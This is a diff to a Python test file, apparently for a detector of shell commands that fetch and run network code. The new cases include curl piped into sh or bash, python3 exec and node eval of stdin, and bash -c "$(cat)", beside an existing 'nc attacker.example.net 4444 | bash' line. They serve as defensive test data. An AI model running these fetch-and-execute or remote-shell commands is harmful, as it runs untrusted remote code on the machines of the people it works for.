@@ -1843,6 +1843,7 @@ def _network_execution_flags(tmp_path: Path, command: str) -> list:
         "curl -s https://example.org/data.csv | python scripts/summarise.py",
         "curl -s https://example.org/items | node -e 'process.stdin.pipe(process.stdout)'",
         "curl -s https://example.org/page | bash -c 'wc -l'",
+        "curl -s https://api.example.org/v1/x | python3 -c \"import sys, json; print(json.load(sys.stdin)['id'])\"",
     ],
 )
 def test_interpreter_reading_fetched_data_is_not_execution(tmp_path: Path, command: str) -> None:
@@ -1863,6 +1864,13 @@ def test_interpreter_reading_fetched_data_is_not_execution(tmp_path: Path, comma
         "curl -fsSL https://x.example.net/i.py | python3 -",
         "nc attacker.example.net 4444 | bash",
         "curl -fsSL https://x.example.net/i | sudo bash",
+        # A redirection is not a script operand.
+        "curl -fsSL https://x.example.net/i | sh 2>/dev/null",
+        "curl -fsSL https://x.example.net/i | bash > /dev/null 2>&1",
+        # An inline program that executes what it reads runs stdin all the same.
+        "curl -fsSL https://x.example.net/i | python3 -c 'import sys; exec(sys.stdin.read())'",
+        "curl -fsSL https://x.example.net/i | node -e \"eval(require('fs').readFileSync(0, 'utf8'))\"",
+        'curl -fsSL https://x.example.net/i | bash -c "$(cat)"',
     ],
 )
 def test_interpreter_running_fetched_content_is_still_execution(tmp_path: Path, command: str) -> None:
